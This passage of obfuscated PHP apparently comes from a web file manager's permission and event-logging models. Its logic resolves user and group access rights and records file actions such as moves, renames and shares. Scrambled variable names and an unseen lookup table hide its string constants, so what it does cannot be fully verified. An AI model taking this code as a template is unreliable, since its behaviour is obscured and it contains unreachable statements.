(!isset($£Ç§£Æ[$ÔŞ…øôÆ])) { continue; } $Âê£æø÷ = $this->authMake($£Ç§£Æ[$ÔŞ…øôÆ], $ñœ¦¨Îü); if ($Âê£æø÷[$¸ãÅ¨àİ[563]]) { $îçÂÙİ³ = $Âê£æø÷; break; } } if (!$»æÕ¬) { return $îçÂÙİ³; } if (!$îçÂÙİ³ && $«ûó¿ªÀ) { $îçÂÙİ³ = $this->groupAuthInfo($«ûó¿ªÀ, $÷ áÈ³); } if (!$îçÂÙİ³) { $–ª„‘×§ = Model($¸ãÅ¨àİ[612])->getInfo($÷ áÈ³); $şòôİ‘Ö = explode($¸ãÅ¨àİ[50], trim($–ª„‘×§[$¸ãÅ¨àİ[611]], $¸ãÅ¨àİ[50])); $şòôİ‘Ö = array_reverse($şòôİ‘Ö); foreach ($şòôİ‘Ö as $ˆ†å–) { if ($ˆ†å– == $¸ãÅ¨àİ[229] || $ˆ†å– == $‚‘ş¯Õç) { continue; } $¦Ÿ¸ğû = $this->groupRootAuth($ˆ†å–, $ñœ¦¨Îü); if (!$¦Ÿ¸ğû) { continue; } $îçÂÙİ³ = $this->groupAuthInfo($¦Ÿ¸ğû, $ˆ†å–); break; } } if (!$îçÂÙİ³ || $îçÂÙİ³[$¸ãÅ¨àİ[510]] <= 0) { $Ğë¨éî² = $this->authDeepCheck($¸¼Àö©¸[$¸ãÅ¨àİ[192]], $ñœ¦¨Îü); if ($Ğë¨éî²) { $îçÂÙİ³ = $Ğë¨éî²; } } return $îçÂÙİ³; } private function userIsRoot($¦—€—Àù = false) { $®á‹Ü’å =& $_SERVER[€ä¾™²]; if (!$¦—€—Àù && KodUser::isRoot()) { return !0; } $µñ»Øªœ = Model($®á‹Ü’å[624])->getInfo($¦—€—Àù); $…¡¦ÆÅÔ = Model($®á‹Ü’å[2317])->listData($µñ»Øªœ[$®á‹Ü’å[2318]]); if ($…¡¦ÆÅÔ && $…¡¦ÆÅÔ[$®á‹Ü’å[602]][$®á‹Ü’å[2321]] == 1) { return !0; } return !1; } private function sourceAuthInfo($Œîè·Ôİ) { $»³ÆÒíú =& $_SERVER[€ä¾™²]; $„£“·™ = Model($»³ÆÒíú[1479]); $Ç‹äŒ—Ø = $„£“·™->sourceInfo($Œîè·Ôİ); if (!$Ç‹äŒ—Ø) { return !1; } $„£“·™->groupPathDisplay($Ç‹äŒ—Ø); $İ³úá¡‡ = array($Ç‹äŒ—Ø); $İ³úá¡‡ = $„£“·™->_listAppendPath($İ³úá¡‡, !1); $Ç‹äŒ—Ø = $İ³úá¡‡[0]; $úŸÊÚã› = $Ç‹äŒ—Ø[$»³ÆÒíú[609]]; if (isset($Ç‹äŒ—Ø[$»³ÆÒíú[617]])) { $ãÙ´ÁÁ¥ = explode($»³ÆÒíú[8], trim($Ç‹äŒ—Ø[$»³ÆÒíú[609]], $»³ÆÒíú[8])); array_shift($ãÙ´ÁÁ¥); $úŸÊÚã› = $Ç‹äŒ—Ø[$»³ÆÒíú[615]] . $»³ÆÒíú[2341] . implode($»³ÆÒíú[8], $ãÙ´ÁÁ¥); } return array($»³ÆÒíú[32] => $Ç‹äŒ—Ø[$»³ÆÒíú[32]], $»³ÆÒíú[192] => $Ç‹äŒ—Ø[$»³ÆÒíú[192]], $»³ÆÒíú[87] => KodIO::make($Ç‹äŒ—Ø[$»³ÆÒíú[192]]), $»³ÆÒíú[609] => $úŸÊÚã›); } private function groupAuthInfo($˜¸÷†ğÄ, $Äşıàù—) { $Œ¯œŞ±Š =& $_SERVER[€ä¾™²]; $“å÷ŒüĞ = Model($Œ¯œŞ±Š[612])->getInfo($Äşıàù—); return array($Œ¯œŞ±Š[2342] => intval($˜¸÷†ğÄ[$Œ¯œŞ±Š[509]]), $Œ¯œŞ±Š[2332] => $˜¸÷†ğÄ, $Œ¯œŞ±Š[2343] => LNG($Œ¯œŞ±Š[2344]), $Œ¯œŞ±Š[2338] => array($Œ¯œŞ±Š[516] => $“å÷ŒüĞ[$Œ¯œŞ±Š[32]], $Œ¯œŞ±Š[87] => KodIO::make($“å÷ŒüĞ[$Œ¯œŞ±Š[90]][$Œ¯œŞ±Š[192]]), $Œ¯œŞ±Š[2345] => $“å÷ŒüĞ[$Œ¯œŞ±Š[616]])); } protected function groupRootAuth($ŸÈ§×ó¼, $ì§¹¹ÄÜ = false) { $ÜÔÉÍÇò =& $_SERVER[€ä¾™²]; $ì§¹¹ÄÜ = $ì§¹¹ÄÜ ? $ì§¹¹ÄÜ : USER_ID; $æ€ú¤¿ä = $ì§¹¹ÄÜ . $ÜÔÉÍÇò[2346] . $ŸÈ§×ó¼; static $Âı¾Ÿ„ = array(); if (isset($Âı¾Ÿ„[$æ€ú¤¿ä])) { return $Âı¾Ÿ„[$æ€ú¤¿ä]; } $¢£ï†ûÎ = Model($ÜÔÉÍÇò[612])->getInfo($ŸÈ§×ó¼); $ÇĞß¼§İ = $this->userGroupList($ì§¹¹ÄÜ); $ûÔµœ“» = isset($ÇĞß¼§İ[$ŸÈ§×ó¼]) ? $ÇĞß¼§İ[$ŸÈ§×ó¼][$ÜÔÉÍÇò[509]] : !1; if ($ûÔµœ“» && Model($ÜÔÉÍÇò[598])->authCheckAction($ûÔµœ“»[$ÜÔÉÍÇò[509]], $ÜÔÉÍÇò[1511])) { $Âı¾Ÿ„[$æ€ú¤¿ä] = $ûÔµœ“»; return $ûÔµœ“»; } $—½ ¢…Ö = $this->sourceAuthSelect($¢£ï†ûÎ[$ÜÔÉÍÇò[90]][$ÜÔÉÍÇò[192]]); $úë›Õ„® = $—½ ¢…Ö ? $this->authMake($—½ ¢…Ö, $ì§¹¹ÄÜ) : !1; $¼¾ƒÛ = $úë›Õ„® ? $úë›Õ„®[$ÜÔÉÍÇò[563]] : !1; $Âı¾Ÿ„[$æ€ú¤¿ä] = $¼¾ƒÛ ? $¼¾ƒÛ : $ûÔµœ“»; return $Âı¾Ÿ„[$æ€ú¤¿ä]; } public function authOwnerApply($±¢Ú›ó¨) { $òóéÙşÖ =& $_SERVER[€ä¾™²]; if (empty($±¢Ú›ó¨[$òóéÙşÖ[509]]) || isset($±¢Ú›ó¨[$òóéÙşÖ[1530]]) && $±¢Ú›ó¨[$òóéÙşÖ[1530]]) { return $±¢Ú›ó¨; } if (AuthModel::authCheckRoot($±¢Ú›ó¨[$òóéÙşÖ[509]][$òóéÙşÖ[510]])) { return $±¢Ú›ó¨; } $ı©”ª = Model($òóéÙşÖ[1479])->parentLevelArray($±¢Ú›ó¨[$òóéÙşÖ[611]]); $ı©”ª = array_merge(array($±¢Ú›ó¨[$òóéÙşÖ[192]]), array_reverse($ı©”ª)); $âĞ¿£Ç– = $this->sourceAuthSelect($ı©”ª); $›ÃÔ¤²ê = array(); $™³Ëšâ´ = array(); foreach ($âĞ¿£Ç– as $ÆÇÀòö => $À§«ÌÆİ) { $ƒåİîÉ = $this->authFolderOwnerUser($À§«ÌÆİ); $›ÃÔ¤²ê[$ÆÇÀòö] = $ƒåİîÉ; $™³Ëšâ´ = array_merge($™³Ëšâ´, $ƒåİîÉ[$òóéÙşÖ[691]]); if ($ƒåİîÉ[$òóéÙşÖ[2347]]) { break; } } if (count($™³Ëšâ´) == 0) { $™³Ëšâ´ = $this->authFolderOwnerGroup($±¢Ú›ó¨[$òóéÙşÖ[596]]); } $™³Ëšâ´ = array_unique($™³Ëšâ´); if (AuthModel::authCheckRoot($±¢Ú›ó¨[$òóéÙşÖ[509]][$òóéÙşÖ[510]])) { $™³Ëšâ´[] = USER_ID; } $±¢Ú›ó¨[$òóéÙşÖ[509]][$òóéÙşÖ[2348]] = Model($òóéÙşÖ[604])->userListInfo($™³Ëšâ´); return $±¢Ú›ó¨; } private function authFolderOwnerGroup($¸ğŒş¨) { $×‘ä¬·– =& $_SERVER[€ä¾™²]; $éŞ¯»³Ğ = Model($×‘ä¬·–[2220])->where(array($×‘ä¬·–[1441] => $¸ğŒş¨))->select(); $ş£ÔĞìÕ = array(); if (!$éŞ¯»³Ğ) { return $ş£ÔĞìÕ; } foreach ($éŞ¯»³Ğ as $Ìø‚´ÄÜ) { $«±³°˜ = $this->authInfo($Ìø‚´ÄÜ); if (AuthModel::authCheckRoot($«±³°˜[$×‘ä¬·–[509]])) { $ş£ÔĞìÕ[] = $Ìø‚´ÄÜ[$×‘ä¬·–[1539]]; } } return $ş£ÔĞìÕ; } private function authFolderOwnerUser($ùãÖŸŸ–) { $úÇ£Š£æ =& $_SERVER[€ä¾™²]; $Í¦î±¤õ = array(); $¾Úş¥¼İ = !1; foreach ($ùãÖŸŸ– as $ŸšÛï·Ù) { $Ä¼êÆ­Ó = $this->authInfo($ŸšÛï·Ù); if ($ŸšÛï·Ù[$úÇ£Š£æ[596]] == $úÇ£Š£æ[229]) { $¾Úş¥¼İ = !0; } if ($ŸšÛï·Ù[$úÇ£Š£æ[189]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Ä¼êÆ­Ó[$úÇ£Š£æ[509]])) { $Í¦î±¤õ[] = $ŸšÛï·Ù[$úÇ£Š£æ[596]]; } } } return array($úÇ£Š£æ[691] => $Í¦î±¤õ, $úÇ£Š£æ[2347] => $¾Úş¥¼İ); } public function authMake($è’™óá½, $€ÄÊ²û» = false) { $¨İĞ±â« =& $_SERVER[€ä¾™²]; $¸ÚÉ•Íâ = $this->authArrayCheck($è’™óá½, $€ÄÊ²û»); if ($¸ÚÉ•Íâ[$¨İĞ±â«[2328]]) { $¸ÚÉ•Íâ[$¨İĞ±â«[2328]] = $this->sourceAuthInfo($¸ÚÉ•Íâ[$¨İĞ±â«[2328]]); } return $¸ÚÉ•Íâ; } public function authArrayCheck($İÜ¢†õé, $Î¡²ã© = false) { $ÅÌŸ’™² =& $_SERVER[€ä¾™²]; if (!$İÜ¢†õé) { return array($ÅÌŸ’™²[510] => 0, $ÅÌŸ’™²[563] => !1, $ÅÌŸ’™²[2343] => $ÅÌŸ’™²[12]); } $Î¡²ã© = $Î¡²ã© ? $Î¡²ã© : USER_ID; $¨•Ê²öÃ = 0; $ÂÊºƒ’ó = 0; $ÊÈ¦ƒÍÔ = 0; $Á½ªÂÜµ = 0; $“çÙâ— = 0; $Ëˆ€„ï¼ = 0; $Ã©ûÔÛ = 0; $àÔ„‰¡ = 0; $š‰­ÓÚ = 1000; $¼‡Æ¢Çì = 0; $ù²ä¸¦ğ = 0; $Ğ£˜ÁËÀ = 0; $„é©êú¤ = 0; $Ç®ô°÷ = 0; foreach ($İÜ¢†õé as $Öù¾ïŸ°) { $ğÜÖû¦ = $this->authInfo($Öù¾ïŸ°); if (!$ğÜÖû¦) { continue; } $–€³ Ôç = $Öù¾ïŸ°[$ÅÌŸ’™²[596]]; $©Ò”£‹Ç = $Öù¾ïŸ°[$ÅÌŸ’™²[192]]; $ËˆÒï™ = intval($ğÜÖû¦[$ÅÌŸ’™²[509]]); if ($Öù¾ïŸ°[$ÅÌŸ’™²[189]] == SourceModel::TYPE_USER && $–€³ Ôç == $Î¡²ã©) { $¨•Ê²öÃ = !0; $ÊÈ¦ƒÍÔ = $ğÜÖû¦; $ÂÊºƒ’ó = $ËˆÒï™; $Á½ªÂÜµ = $©Ò”£‹Ç; } else { if ($Öù¾ïŸ°[$ÅÌŸ’™²[189]] == SourceModel::TYPE_GROUP && $this->groupContainUser($–€³ Ôç, $Î¡²ã©)) { $“çÙâ— = !0; $›ŞÚ£˜· = $this->groupStepToUserGroup($–€³ Ôç, $Î¡²ã©); if ($›ŞÚ£˜· < $š‰­ÓÚ) { $š‰­ÓÚ = $›ŞÚ£˜·; $Ëˆ€„ï¼ = $ËˆÒï™; $Ã©ûÔÛ = $ğÜÖû¦; $¼‡Æ¢Çì = $–€³ Ôç; $àÔ„‰¡ = $©Ò”£‹Ç; } if ($›ŞÚ£˜· == $š‰­ÓÚ && $ËˆÒï™ >= $Ëˆ€„ï¼) { $Ëˆ€„ï¼ = $ËˆÒï™; $Ã©ûÔÛ = $ğÜÖû¦; $¼‡Æ¢Çì = $–€³ Ôç; $àÔ„‰¡ = $©Ò”£‹Ç; } } else { if (!$–€³ Ôç || $–€³ Ôç == $ÅÌŸ’™²[229]) { $ù²ä¸¦ğ = !0; $„é©êú¤ = $ğÜÖû¦; $Ğ£˜ÁËÀ = $ËˆÒï™; $Ç®ô°÷ = $©Ò”£‹Ç; } } } } if ($¨•Ê²öÃ) { $†Ä–ÇºÆ = $ÂÊºƒ’ó; $ğÜÖû¦ = $ÊÈ¦ƒÍÔ; $Ÿë¶­áŠ = $Á½ªÂÜµ; $³ òîš = LNG($ÅÌŸ’™²[2349]); } else { if ($“çÙâ—) { $†Ä–ÇºÆ = $Ëˆ€„ï¼; $ğÜÖû¦ = $Ã©ûÔÛ; $Ÿë¶­áŠ = $àÔ„‰¡; $Èßşá = Model($ÅÌŸ’™²[612])->getInfo($¼‡Æ¢Çì); $³ òîš = $ÅÌŸ’™²[174] . $Èßşá[$ÅÌŸ’™²[616]] . $ÅÌŸ’™²[2350] . LNG($ÅÌŸ’™²[2351]); } else { if ($ù²ä¸¦ğ) { $†Ä–ÇºÆ = $Ğ£˜ÁËÀ; $ğÜÖû¦ = $„é©êú¤; $Ÿë¶­áŠ = $Ç®ô°÷; $³ òîš = LNG($ÅÌŸ’™²[2330]); } else { $†Ä–ÇºÆ = 0; $ğÜÖû¦ = !1; $³ òîš = $ÅÌŸ’™²[12]; $Ÿë¶­áŠ = $ÅÌŸ’™²[12]; } } } $éá†Ö»Ğ = array($ÅÌŸ’™²[2342] => intval($†Ä–ÇºÆ), $ÅÌŸ’™²[2332] => $ğÜÖû¦, $ÅÌŸ’™²[2343] => $³ òîš, $ÅÌŸ’™²[2338] => $Ÿë¶­áŠ); return $éá†Ö»Ğ; } private function groupContainUser($¯“ã”Â¡, $¿±‰ÊÙ = false) { return in_array($¯“ã”Â¡, $this->userGroupParents($¿±‰ÊÙ)); } private function groupStepToUserGroup($ã‚¿åû, $€¢Ùµ¾« = false) { $â·£¥¿ç =& $_SERVER[€ä¾™²]; $¬†õ§ñÃ = $this->userGroupList($€¢Ùµ¾«); $€¼¥Ëœ• = 1000; $µªå‰ç‘ = $GLOBALS[$â·£¥¿ç[6]][$â·£¥¿ç[92]][$â·£¥¿ç[2233]] == 1; $§ÉšŞ¼Œ = $µªå‰ç‘ ? 3 : 2; foreach ($¬†õ§ñÃ as $§ãŞ°°Ï) { if ($§ãŞ°°Ï[$â·£¥¿ç[1441]] == $ã‚¿åû) { return 0; } $¤¥ŒÁì× = explode($â·£¥¿ç[50], trim($§ãŞ°°Ï[$â·£¥¿ç[611]], $â·£¥¿ç[50])); if ($¤¥ŒÁì×[0] == $â·£¥¿ç[229] && count($¤¥ŒÁì×) > $§ÉšŞ¼Œ) { $©ÙÆõ = array_reverse(array_slice($¤¥ŒÁì×, $§ÉšŞ¼Œ)); $¾¹°ƒî = array_search($ã‚¿åû, $©ÙÆõ); if ($¾¹°ƒî !== !1 && $¾¹°ƒî + 1 <= $€¼¥Ëœ•) { $€¼¥Ëœ• = $¾¹°ƒî + 1; } } } return $€¼¥Ëœ•; } private function userGroupList($°éèõ­à = false, $›–„°úÆ = false) { $¹Ô›¯Ã¥ =& $_SERVER[€ä¾™²]; static $‹ØÙÙ” = array(); if (isset($‹ØÙÙ”[$°éèõ­à])) { return $‹ØÙÙ”[$°éèõ­à]; } if (!$›–„°úÆ) { $›–„°úÆ = Model($¹Ô›¯Ã¥[624])->getInfo($°éèõ­à); } $‹ØÙÙ”[$°éèõ­à] = array_to_keyvalue($›–„°úÆ[$¹Ô›¯Ã¥[1440]], $¹Ô›¯Ã¥[1441]); return $‹ØÙÙ”[$°éèõ­à]; } public function userGroupParents($›êÖ¢öï) { $ò”´æ— =& $_SERVER[€ä¾™²]; static $ƒÓ‘»ıÎ = array(); $›êÖ¢öï = $›êÖ¢öï ? $›êÖ¢öï : USER_ID; if (isset($ƒÓ‘»ıÎ[$›êÖ¢öï])) { return $ƒÓ‘»ıÎ[$›êÖ¢öï]; } $¶§ÅÆ¬… = $this->userGroupList($›êÖ¢öï); $³Éœİ¶ö = array(); $¡Ñ…û = $GLOBALS[$ò”´æ—[6]][$ò”´æ—[92]][$ò”´æ—[2233]] == 1; $®îêÕ£é = $¡Ñ…û ? 3 : 2; foreach ($¶§ÅÆ¬… as $â‹Ñî–ú) { $€Ïä–šü = array($â‹Ñî–ú[$ò”´æ—[1441]]); $¹¸™Ú÷† = explode($ò”´æ—[50], trim($â‹Ñî–ú[$ò”´æ—[611]], $ò”´æ—[50])); if ($¹¸™Ú÷†[0] == $ò”´æ—[229] && count($¹¸™Ú÷†) > $®îêÕ£é) { $‹Ÿ§ñõ¡ = array_slice($¹¸™Ú÷†, $®îêÕ£é); $€Ïä–šü = array_merge($€Ïä–šü, array_reverse($‹Ÿ§ñõ¡)); } $³Éœİ¶ö = array_merge($³Éœİ¶ö, $€Ïä–šü); } $ƒÓ‘»ıÎ[$›êÖ¢öï] = array_unique($³Éœİ¶ö); return $ƒÓ‘»ıÎ[$›êÖ¢öï]; } public function authTargetInfoMake($×ôùÖÇ) { $È–øÕ¼« =& $_SERVER[€ä¾™²]; $¨‡úÇŒó = array(); $ô¢ÅÜæï = array(); foreach ($×ôùÖÇ as $¥ıƒø³Ç) { if ($¥ıƒø³Ç[$È–øÕ¼«[189]] == SourceModel::TYPE_USER) { $¨‡úÇŒó[] = intval($¥ıƒø³Ç[$È–øÕ¼«[596]]); } else { if ($¥ıƒø³Ç[$È–øÕ¼«[189]] == SourceModel::TYPE_GROUP) { $ô¢ÅÜæï[] = intval($¥ıƒø³Ç[$È–øÕ¼«[596]]); } } } if ($¨‡úÇŒó) { $¨‡úÇŒó = Model($È–øÕ¼«[604])->userListInfo($¨‡úÇŒó); } if ($ô¢ÅÜæï) { $¡½…øç = array($È–øÕ¼«[2213] => array($È–øÕ¼«[514], $ô¢ÅÜæï)); $ô¢ÅÜæï = Model($È–øÕ¼«[612])->field($È–øÕ¼«[2352])->where($¡½…øç)->select(); $ô¢ÅÜæï = array_to_keyvalue($ô¢ÅÜæï, $È–øÕ¼«[1441]); } return array($È–øÕ¼«[2353] => $¨‡úÇŒó, $È–øÕ¼«[2354] => $ô¢ÅÜæï); } public function authInfo($Ñ†œÙˆ) { $şŒ¿Ä± =& $_SERVER[€ä¾™²]; if ($Ñ†œÙˆ[$şŒ¿Ä±[1586]]) { $Ğ“©––‰ = Model($şŒ¿Ä±[598])->listData($Ñ†œÙˆ[$şŒ¿Ä±[1586]]); if (!$Ğ“©––‰) { return !1; $È€Ù©“€ = Model($şŒ¿Ä±[598])->listData(); $ÇÄÉ¤š„ = array_filter_by_field($È€Ù©“€, $şŒ¿Ä±[509], $şŒ¿Ä±[229]); return $ÇÄÉ¤š„; } $Íöİ•ö” = array_field_key($Ğ“©––‰, array($şŒ¿Ä±[486], $şŒ¿Ä±[32], $şŒ¿Ä±[509], $şŒ¿Ä±[2149], $şŒ¿Ä±[2150])); $Íöİ•ö”[$şŒ¿Ä±[2355]] = $Ñ†œÙˆ; return $Íöİ•ö”; } else { return array($şŒ¿Ä±[515] => 0, $şŒ¿Ä±[2134] => $Ñ†œÙˆ[$şŒ¿Ä±[2290]], $şŒ¿Ä±[516] => $şŒ¿Ä±[12], $şŒ¿Ä±[2149] => $şŒ¿Ä±[2356]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\x75\x72\x63\x65\137\145\x76\x65\156\164"; protected $dataAuto = array(array("\x63\162\145\141\164\145\124\x69\x6d\145", "\164\151\x6d\145", "\x69\x6e\163\x65\x72\164", "\146\165\156\x63\x74\151\x6f\156"), array("\144\x65\x73\143", '', "\151\156\x73\x65\x72\164\54\x75\x70\x64\141\164\x65\54\163\145\154\145\143\x74", "\152\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($˜ÉÁ¤¦, $â ‚¨ãœ, $úõûíÆ = '') { $ığÉ€îé =& $_SERVER[€ä¾™²]; if (!$this->eventSave) { return; } $©ä–ÈôĞ = Model($ığÉ€îé[1479])->sourceInfo($˜ÉÁ¤¦); if (!$©ä–ÈôĞ) { return !1; } if ($this->isDisableEvent($©ä–ÈôĞ, $â ‚¨ãœ)) { return; } if ($úõûíÆ && is_string($úõûíÆ)) { $úõûíÆ = array($ığÉ€îé[2166] => $úõûíÆ); } $‹Äğ«Ü = KodUser::id(); $›êÖõİ = array($ığÉ€îé[513] => $˜ÉÁ¤¦, $ığÉ€îé[2357] => $©ä–ÈôĞ[$ığÉ€îé[191]], $ığÉ€îé[2358] => $©ä–ÈôĞ[$ığÉ€îé[32]], $ığÉ€îé[609] => !empty($©ä–ÈôĞ[$ığÉ€îé[609]]) ? $©ä–ÈôĞ[$ığÉ€îé[609]] : $ığÉ€îé[12], $ığÉ€îé[1913] => $‹Äğ«Ü, $ığÉ€îé[518] => $â ‚¨ãœ, $ığÉ€îé[1915] => $úõûíÆ); $this->addSystemLog($â ‚¨ãœ, $›êÖõİ); unset($›êÖõİ[$ığÉ€îé[2358]], $›êÖõİ[$ığÉ€îé[609]]); return $this->add($›êÖõİ); } private function addSystemLog($„¸ˆôŒĞ, $ÓíØ¡·û) { $»‰õÂ¬ =& $_SERVER[€ä¾™²]; if ($„¸ˆôŒĞ == $»‰õÂ¬[2359]) { $„¸ˆôŒĞ = $ÓíØ¡·û[$»‰õÂ¬[547]][$»‰õÂ¬[2360]]; } else { if (in_array($„¸ˆôŒĞ, array($»‰õÂ¬[1509], $»‰õÂ¬[2361]))) { $„¸ˆôŒĞ = $ÓíØ¡·û[$»‰õÂ¬[547]][$»‰õÂ¬[169]]; } } $ìğö©» = array_merge($ÓíØ¡·û, array($»‰õÂ¬[2362] => $ÓíØ¡·û[$»‰õÂ¬[192]], $»‰õÂ¬[2363] => $ÓíØ¡·û[$»‰õÂ¬[2363]])); Hook::trigger($»‰õÂ¬[2364], $»‰õÂ¬[2365] . $„¸ˆôŒĞ, $ÓíØ¡·û); Model($»‰õÂ¬[2075])->addLog($»‰õÂ¬[2365] . $„¸ˆôŒĞ, $ìğö©»); } private function isDisableEvent($ò½™¹Ôë, $„ö‘Çø) { $î§‚‘ÏŸ =& $_SERVER[€ä¾™²]; if ($ò½™¹Ôë[$î§‚‘ÏŸ[189]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($„ö‘Çø == $î§‚‘ÏŸ[1277]) { return !1; } return !0; } public function eventCreate($¢°„ÇÙİ, $ïßÙ³×) { $‘ûÕß’ =& $_SERVER[€ä¾™²]; $ÃÌê¬™ = Model($‘ûÕß’[1479])->sourceInfo($¢°„ÇÙİ); $¬•»€®Ú = array($‘ûÕß’[2360] => $ïßÙ³×, $‘ûÕß’[32] => $ÃÌê¬™[$‘ûÕß’[32]]); return $this->addEvent($¢°„ÇÙİ, $‘ûÕß’[2359], $¬•»€®Ú); } public function eventFileEdit($»¨ÑÈ¡) { $Ò¨¯÷íâ =& $_SERVER[€ä¾™²]; $¥îÆ©Ã× = array($Ò¨¯÷íâ[2366] => $_SERVER[$Ò¨¯÷íâ[2367]], $Ò¨¯÷íâ[2368] => strtolower(ACTION)); if (isset($GLOBALS[$Ò¨¯÷íâ[7]][$Ò¨¯÷íâ[1569]])) { $¥îÆ©Ã×[$Ò¨¯÷íâ[1569]] = $Ò¨¯÷íâ[91]; } return $this->addEvent($»¨ÑÈ¡, $Ò¨¯÷íâ[1508], $¥îÆ©Ã×); } public function eventRecycle($Ï½¡Ïõ, $Ç€Å¾‚Ê) { return $this->addEvent($Ï½¡Ïõ, $_SERVER[€ä¾™²][2361], $Ç€Å¾‚Ê); } private static $_removeLast = ''; public function eventRemove($‰ùÕØâ¿) { $¶ÉşØË¯ =& $_SERVER[€ä¾™²]; self::$_removeLast = $‰ùÕØâ¿; $£ºÖÀË = Model($¶ÉşØË¯[1479])->sourceInfo($‰ùÕØâ¿); $ŒµíÁÊø = array_field_key($£ºÖÀË, array($¶ÉşØË¯[192], $¶ÉşØË¯[564], $¶ÉşØË¯[527], $¶ÉşØË¯[611])); $ñ³ªßš“ = array($¶ÉşØË¯[169] => $£ºÖÀË[$¶ÉşØË¯[32]], $¶ÉşØË¯[2368] => ACTION, $¶ÉşØË¯[2369] => $ŒµíÁÊø); return $this->addEvent($£ºÖÀË[$¶ÉşØË¯[191]], $¶ÉşØË¯[1277], $ñ³ªßš“); } public function eventShare($¹ëÂùÂ³, $óÊ¢·š) { return $this->addEvent($¹ëÂùÂ³, $_SERVER[€ä¾™²][1509], $óÊ¢·š); } public function eventMove($©âÇ¯œÌ, $£ÍÃùÌ¤, $î’á”é ) { $÷Ãö‘¨¼ =& $_SERVER[€ä¾™²]; if (self::$_removeLast == $©âÇ¯œÌ) { return; } $ô¥¤¯Õ = Model($÷Ãö‘¨¼[1479]); $†“áò“‘ = $ô¥¤¯Õ->sourceInfo($©âÇ¯œÌ); $Ÿ†»¾É¾ = $ô¥¤¯Õ->sourceInfo($£ÍÃùÌ¤); $ßÚÇ­ = $ô¥¤¯Õ->sourceInfo($î’á”é ); $”İ‹Ù‹¢ = array($÷Ãö‘¨¼[1289] => $£ÍÃùÌ¤, $÷Ãö‘¨¼[2370] => $Ÿ†»¾É¾[$÷Ãö‘¨¼[32]], $÷Ãö‘¨¼[2328] => !empty($Ÿ†»¾É¾[$÷Ãö‘¨¼[609]]) ? $Ÿ†»¾É¾[$÷Ãö‘¨¼[609]] : $÷Ãö‘¨¼[12], $÷Ãö‘¨¼[1290] => $î’á”é , $÷Ãö‘¨¼[2371] => $ßÚÇ­[$÷Ãö‘¨¼[32]], $÷Ãö‘¨¼[2372] => !empty($ßÚÇ­[$÷Ãö‘¨¼[609]]) ? $ßÚÇ­[$÷Ãö‘¨¼[609]] : $÷Ãö‘¨¼[12]); $this->addEvent($©âÇ¯œÌ, $÷Ãö‘¨¼[650], $”İ‹Ù‹¢); $†“áò“‘ = $ô¥¤¯Õ->sourceInfo($©âÇ¯œÌ); $”İ‹Ù‹¢ = array($÷Ãö‘¨¼[192] => $†“áò“‘[$÷Ãö‘¨¼[192]], $÷Ãö‘¨¼[32] => $†“áò“‘[$÷Ãö‘¨¼[32]]); $this->addEvent($£ÍÃùÌ¤, $÷Ãö‘¨¼[2373], $”İ‹Ù‹¢); } public function eventCopy($æ“É¬¢ù) { $this->eventCreate($æ“É¬¢ù, $_SERVER[€ä¾™²][648]); } public function eventRename($ÆÓµ­Ó¨, $±ñêÊ™ó, $†ÇÀÒÈÉ) { $É—™¼Ÿ‘ =& $_SERVER[€ä¾™²]; $ÊàƒØÑŠ = array($É—™¼Ÿ‘[1289] => $±ñêÊ™ó, $É—™¼Ÿ‘[1290] => $†ÇÀÒÈÉ); return $this->addEvent($ÆÓµ­Ó¨, $É—™¼Ÿ‘[1493], $ÊàƒØÑŠ); } public function eventAddComment($ØƒÎÌî, $•­‡¡×Ì) { return $this->addEvent($ØƒÎÌî, $_SERVER[€ä¾™²][2374], $•­‡¡×Ì); } public function eventAddDesc($’§¹æ˜ô, $ûšá¿éÂ) { return $this->addEvent($’§¹æ˜ô, $_SERVER[€ä¾™²][2375], $ûšá¿éÂ); } public function listBySource($šŠê‹Ñ) { $ãş‹ŒÂ =& $_SERVER[€ä¾™²]; $³æøØ‰Ğ = Model($ãş‹ŒÂ[1479])->sourceInfo($šŠê‹Ñ); $é™ìËÖ = array($ãş‹ŒÂ[513] => $šŠê‹Ñ); if ($³æøØ‰Ğ[$ãş‹ŒÂ[507]] == $ãş‹ŒÂ[91]) { $„¼ã™Æ¼ = Model($ãş‹ŒÂ[1479])->listSearchChildren($šŠê‹Ñ, 20000); $„¼ã™Æ¼[] = $šŠê‹Ñ . $ãş‹ŒÂ[463]; $é™ìËÖ = array($ãş‹ŒÂ[192] => array($ãş‹ŒÂ[7], $„¼ã™Æ¼)); } $½ƒº¸Ó = $this->where($é™ìËÖ)->order($ãş‹ŒÂ[2376])->selectPage(); if ($½ƒº¸Ó[$ãş‹ŒÂ[443]][$ãş‹ŒÂ[444]] == 0) { $½ƒº¸Ó[$ãş‹ŒÂ[443]][$ãş‹ŒÂ[444]] = 1; $½ƒº¸Ó[$ãş‹ŒÂ[446]] = array(array($ãş‹ŒÂ[513] => $šŠê‹Ñ, $ãş‹ŒÂ[2357] => $³æøØ‰Ğ[$ãş‹ŒÂ[191]], $ãş‹ŒÂ[1913] => $³æøØ‰Ğ[$ãş‹ŒÂ[548]], $ãş‹ŒÂ[518] => $ãş‹ŒÂ[2377], $ãş‹ŒÂ[519] => $³æøØ‰Ğ[$ãş‹ŒÂ[232]], $ãş‹ŒÂ[1915] => $ãş‹ŒÂ[12])); } return $this->eventListParse($½ƒº¸Ó, $šŠê‹Ñ); } private function eventListParse($‡¸ñê†ì, $‰úô¹®Ø) { $œâÕÀÃƒ =& $_SERVER[€ä¾™²]; $ÎŸĞá¿ = $‡¸ñê†ì[$œâÕÀÃƒ[446]]; $ºÎ·„Ã = array_to_keyvalue($ÎŸĞá¿, $œâÕÀÃƒ[12], $œâÕÀÃƒ[192]); $İØ•Š‡ = array_to_keyvalue($ÎŸĞá¿, $œâÕÀÃƒ[12], $œâÕÀÃƒ[2363]); foreach ($ÎŸĞá¿ as $ú¿¦ãé) { $´ê¿íé¥ = $ú¿¦ãé[$œâÕÀÃƒ[547]]; if ($ú¿¦ãé[$œâÕÀÃƒ[33]] == $œâÕÀÃƒ[650] && isset($´ê¿íé¥[$œâÕÀÃƒ[1289]])) { $ºÎ·„Ã[] = $´ê¿íé¥[$œâÕÀÃƒ[1289]] . $œâÕÀÃƒ[12]; $ºÎ·„Ã[] = 